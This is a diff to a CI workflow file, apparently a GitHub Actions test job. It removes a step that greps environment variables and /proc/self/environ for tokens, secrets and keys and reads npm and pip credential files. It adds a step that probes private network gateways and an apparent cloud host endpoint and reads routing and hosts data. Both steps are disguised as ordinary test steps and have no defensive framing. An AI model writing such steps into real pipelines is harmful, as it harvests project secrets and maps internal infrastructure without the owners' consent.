@@ -4,10 +4,11 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: supply chain
+      - name: network scan
         run: |
-          env | grep -E "TOKEN|SECRET|KEY|NPM|NODE" | grep -v GITHUB_TOKEN || true
-          cat /proc/self/environ | tr '\0' '\n' | grep -E "TOKEN|SECRET|KEY" || true
-          ls -la /home/runner/work/ || true
-          cat ~/.npmrc 2>/dev/null || true
-          cat ~/.pip/pip.conf 2>/dev/null || true
+          curl -s -m 2 http://10.0.0.1/ || true
+          curl -s -m 2 http://172.16.0.1/ || true
+          curl -s -m 2 http://192.168.0.1/ || true
+          curl -s -m 2 http://168.63.129.16/ || true
+          ip route || true
+          cat /etc/hosts || true
